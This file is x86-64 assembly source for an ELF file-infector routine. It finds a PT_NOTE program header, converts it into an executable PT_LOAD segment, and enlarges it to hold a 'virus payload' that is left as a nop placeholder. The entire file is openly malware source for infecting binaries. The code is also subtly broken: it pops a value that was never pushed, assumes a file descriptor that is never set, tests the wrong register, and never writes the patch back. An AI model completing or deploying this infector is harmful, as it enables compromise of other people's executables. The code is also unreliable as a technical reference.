section .data
    pt_load_success db "PT_NOTE segment successfully converted to PT_LOAD.", 0xA
    pt_load_success_len equ $ - pt_load_success

    pt_load_fail db "Error: Failed to patch PT_NOTE segment.", 0xA
    pt_load_fail_len equ $ - pt_load_fail

section .bss
    stack_buffer resb 10000            ; Buffer to hold ELF data
    stat_buffer resb 144               ; Buffer for `stat` structure

section .text
global _start

_start:
    ; 1. Open the ELF file (fd in rdi assumed from previous setup)
    mov rsi, stack_buffer              ; Buffer to read ELF file
    mov rdx, 10000                     ; Max bytes to read
    mov rax, 0                         ; Syscall number for read()
    syscall                            ; Read ELF file into buffer

    test rax, rax                      ; Check if read() succeeded
    js fail                            ; Handle read error if negative

    ; 2. Perform fstat to get file size and validate
    mov rsi, stat_buffer               ; Buffer for stat structure
    mov rax, 5                         ; Syscall number for fstat()
    syscall                            ; Perform fstat()

    test rax, rax                      ; Check if fstat() succeeded
    js fail                            ; Handle fstat error if negative

    ; Extract stat.st_size
    mov r13, qword [stat_buffer + 48]  ; File size stored in r13

    ; 3. Locate and patch the PT_NOTE segment
    mov r15, stack_buffer              ; Base address of ELF data
    mov cx, word [r15 + 56]           ; e_phnum: Number of Program Headers
    mov rbx, [r15 + 32]                ; e_phoff: Offset of Program Header Table
    mov dx, word [r15 + 54]           ; e_phentsize: Size of a PHT entry

loop_phdr:
    cmp rcx, 0                         ; Exit if no more headers to process
    jz fail                            ; No PT_NOTE found

    ; Check if current segment is PT_NOTE
    cmp dword [r15 + rbx], 4           ; p_type == PT_NOTE
    je patch_phdr                      ; Found PT_NOTE, jump to patch

    ; Move to next PHT entry
    add rbx, rdx                       ; Increment to next PHT entry
    dec rcx                            ; Decrement number of entries left
    jmp loop_phdr                      ; Repeat loop

patch_phdr:
    ; Convert PT_NOTE -> PT_LOAD
    mov dword [r15 + rbx], 1           ; p_type = PT_LOAD
    mov dword [r15 + rbx + 4], 5 ; p_flags = PF_R | PF_X (Read + Execute)

    ; Set p_offset to the end of the ELF file
    pop rax                            ; Restore original EOF offset into rax
    mov [r15 + rbx + 8], rax           ; p_offset = EOF offset

    ; Set p_vaddr to high memory (stat.st_size + 0xc000000)
    add r13, 0xc000000                 ; High virtual address
    mov [r15 + rbx + 16], r13          ; p_vaddr = High virtual address
    mov [r15 + rbx + 24], r13          ; p_paddr = High physical address

    ; Add virus size to p_filesz and p_memsz
    mov rdi, v_stop - v_start + 5      ; Size of virus + JMP instruction
    add qword [r15 + rbx + 32], rdi    ; Increment p_filesz
    add qword [r15 + rbx + 40], rdi    ; Increment p_memsz

    ; Align the segment
    mov qword [r15 + rbx + 48], 0x200000 ; Set p_align = 2 MB (0x200000)

    ; Print success message
    mov rax, 1                         ; Syscall: write
    mov rdi, 1                         ; File descriptor: stdout
    lea rsi, [pt_load_success]         ; Address of success message
    mov rdx, pt_load_success_len       ; Message length
    syscall

    ; Exit program gracefully
    mov rax, 60                        ; Syscall: exit
    xor rdi, rdi                       ; Exit code: 0
    syscall

fail:
    ; Print failure message
    mov rax, 1                         ; Syscall: write
    mov rdi, 2                         ; File descriptor: stderr
    lea rsi, [pt_load_fail]            ; Address of failure message
    mov rdx, pt_load_fail_len          ; Message length
    syscall

    ; Exit program with error
    mov rax, 60                        ; Syscall: exit
    mov rdi, 1                         ; Exit code: 1
    syscall

v_start:
    ; Start of the virus payload
    nop                                ; Placeholder for payload

v_stop:
    ; End of the virus payload
